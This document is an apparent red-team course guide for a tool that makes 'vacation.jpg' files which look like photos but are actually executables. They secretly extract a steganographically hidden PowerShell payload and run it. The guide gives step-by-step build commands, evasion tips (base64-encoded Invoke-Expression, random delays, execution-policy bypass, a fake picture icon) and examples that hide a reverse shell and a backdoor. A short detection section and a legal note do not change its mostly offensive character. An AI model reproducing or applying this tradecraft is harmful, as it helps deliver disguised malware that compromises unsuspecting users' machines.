# Polyglot Payload Creation - Complete Guide

## Quick Start

```bash
# 1. Install dependencies
pip install Pillow opencv-python numpy

# 2. Create your payload script
# (PowerShell script or executable hiding script)

# 3. Run the orchestrator (does everything!)
python orchestrator.py --image my_photo.jpg --payload script.ps1 --output vacation.jpg

# 4. Double-click vacation.jpg
# - Image displays normally
# - Payload executes silently in background
```

---

## What You Need

### Files to Have Ready
- **Original Image** (JPEG or PNG) - The "cover" image users will see
- **Payload** - PowerShell script or executable you want to hide

### Example Payload (PowerShell)
```powershell
# simple_payload.ps1
Write-Host "Payload executed!"
# Add your actual code here...
```

### Install Dependencies
```bash
pip install Pillow opencv-python numpy

# Also ensure PS2EXE is available (for polyglot compilation)
# From PowerShell:
Install-Module PS2EXE -Force
```

---

## Detailed Workflow

### Method 1: Use Orchestrator (Easiest)
**Single command does everything:**

```bash
python orchestrator.py --image vacation_photo.jpg --payload my_script.ps1 --output vacation.jpg
```

**What happens:**
1. ✓ Hides script in image using LSB steganography
2. ✓ Creates PowerShell extractor 
3. ✓ Compiles to EXE and appends JPEG
4. ✓ Outputs final `vacation.jpg` polyglot

**Output:** `vacation.jpg` ready to use!

---

### Method 2: Manual Step-by-Step

#### Step 1: Hide Data in Image (Steganography)
```bash
python steganography.py --mode embed \
    --image vacation_photo.jpg \
    --data my_script.ps1 \
    --output image_with_hidden_data.png
```

**Creates:**
- `image_with_hidden_data.png` - Image with hidden script in LSB
- `image_with_hidden_data_metadata.json` - Extraction info

#### Step 2: Build Extractor Script
```bash
python build_extractor.py \
    --metadata image_with_hidden_data_metadata.json \
    --image image_with_hidden_data.png \
    --payload my_script.ps1 \
    --output final_payload.ps1
```

**Creates:**
- `final_payload.ps1` - PowerShell script that extracts and runs payload

#### Step 3: Create Polyglot
```bash
python create_polyglot.py \
    --script final_payload.ps1 \
    --image vacation_photo.jpg \
    --output vacation.jpg
```

**Creates:**
- `vacation.jpg` - Final polyglot file

---

## How It Works

### Architecture

```
User clicks "vacation.jpg"
         ↓
   [Windows detects MZ header]
         ↓
   Executes as EXE (PS2EXE compiled executable)
         ↓
   [PowerShell starts]
         ↓
   ┌─────────────────────────────────────────┐
   │ 1. Extract embedded image               │
   │    (Base64 decode → Save to %TEMP%)     │
   └──────────────┬──────────────────────────┘
                  ↓
         ┌────────────────────┐
         │ Open original 🖼️   │
         └────────────────────┘
   
   ┌──────────────────────────────────────────┐
   │ 2. Extract LSB hidden data from image    │
   │    (Read pixel LSBs → Reconstruct bytes) │
   └──────────────┬───────────────────────────┘
                  ↓
         ┌──────────────────────┐
         │ Get hidden script    │
         └──────────────────────┘
   
   ┌────────────────────────────────────────┐
   │ 3. Execute hidden script silently       │
   │    (Invoke-Expression)                  │
   └────────────────────────────────────────┘
```

### File Structure at Runtime

**vacation.jpg contains:**
1. **EXE Header** (MZ...)
   - Compiled PowerShell script
   - Contains Base64 encoded image
   - Contains LSB extraction logic
   
2. **Original JPEG** (appended)
   - Readable by any image viewer
   - Starts somewhere in middle of file
   - Ignored by EXE executor

**When opened:**
- Windows sees MZ magic bytes → runs as EXE
- Image viewer sees JPEG markers (FFD8...FFD9) → displays as image
- Both coexist independently!

---

## Advanced Usage

### Extract Hidden Data (For Testing)
```bash
# 1. Extract image with hidden data
python steganography.py --mode extract \
    --image image_with_hidden_data.png \
    --data-length 2048 \
    --output extracted_script.ps1 \
    --metadata image_with_hidden_data_metadata.json
```

### Custom Icon Setup
After creating polyglot:
1. Right-click `vacation.jpg` → Properties
2. Click "Change Icon"
3. Browse to `C:\Windows\System32\shell32.dll`
4. Select a picture-related icon

---

## Troubleshooting

### PS2EXE Not Found
```powershell
# Install from PowerShell Admin:
Install-Module PS2EXE -Force -Scope CurrentUser
```

### Image Not Loading
- Ensure image is valid JPEG or PNG
- Check file path is correct
- Try with different image

### Payload Not Executing
- Verify PowerShell script is valid
- Test script independently:
  ```powershell
  .\my_script.ps1
  ```
- Check PowerShell execution policy:
  ```powershell
  Get-ExecutionPolicy
  # If Restricted, run: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
  ```

### Large File Size
- Polyglot combines EXE + JPEG, so larger than original image
- This is expected and normal
- Use image resolution to balance cover + payload

---

## Detection By Blue Team

### Easy Indicators
- File starts with `MZ` (EXE magic bytes)
- Suspiciously large JPG file
- File size doesn't match image dimensions

### Medium Indicators
- Process spawning from background image file
- PowerShell execution from unknown parent
- Temp file creation with random names

### Hard Detection
- LSB analysis of image pixels
- Memory dump of execution
- Reverse engineering of compiled EXE

---

## Security Best Practices

### Obfuscation Tips
1. **Normal-sized image:** Use 4K or high-res photos
2. **Powershell obfuscation:** 
   ```powershell
   # Instead of direct commands, use:
   $cmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("..."))
   Invoke-Expression $cmd
   ```

3. **Compression:** Compress payload before hiding
   ```powershell
   [System.IO.Compression.GZipStream]::new(...)
   ```

4. **Stealth execution:** Add delays, randomization
   ```powershell
   Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
   ```

---

## File Cleanup

All temporary files are automatically cleaned up. Manual cleanup if needed:

```bash
# Remove temporary files
rm temp_*.png temp_*.json temp_*.ps1
```

---

## Examples

### Example 1: Hide PowerShell Reverse Shell
```bash
python orchestrator.py \
    --image landscape.jpg \
    --payload reverse_shell.ps1 \
    --output vacation.jpg
```

### Example 2: Hide Executable Payload
```bash
python orchestrator.py \
    --image family_photo.jpg \
    --payload backdoor.exe \
    --output photo.jpg
```

### Example 3: Testing
```bash
# 1. Create simple test script
echo 'Write-Host "Success!" ' > test.ps1

# 2. Create small test image (or use existing)
python orchestrator.py --image test.jpg --payload test.ps1

# 3. Run the output
.\vacation.jpg

# Expected output:
# - test.jpg opens in image viewer
# - PowerShell window shows "Success!" (or doesn't show due to -WindowStyle Hidden)
```

---

## Technical Details

### LSB Steganography
- **Method:** Least Significant Bit replacement
- **Capacity:** ~12% of image (1 bit per 8 color bits)
- **1920x1080 RGB:** ~312 KB capacity
- **Detection:** Requires pixel-level entropy/statistical analysis

### Polyglot Structure
```
[MZ header - EXE executable data]
[PE sections and imports]
[Hidden script/data]
[0xFFD8 - JPEG SOI (Start of Image)]
[JPEG image data]
[0xFFD9 - JPEG EOI (End of Image)]
```

---

## Legal Note

This is an educational tool for cybersecurity courses. Use only:
✓ In authorized lab environments
✓ With explicit permission
✓ For defensive/educational purposes
✓ As part of formal coursework

Unauthorized distribution or execution of malicious payloads is illegal.

---

## Support

### Dependencies
```
Pillow == latest
opencv-python == latest
numpy == latest
PS2EXE == latest (PowerShell module)
```

### Python Version
- Tested on Python 3.8+
- Requires 64-bit Python for some operations

### OS Compatibility
- Primary: Windows 10/11
- Polyglot creation: Requires PowerShell + PS2EXE module
- Image viewing: Windows built-in photo apps

---

**Created:** 2025-04-01
**Version:** 1.0
**Purpose:** Advanced Cybersecurity Lab - Red Team Assignment
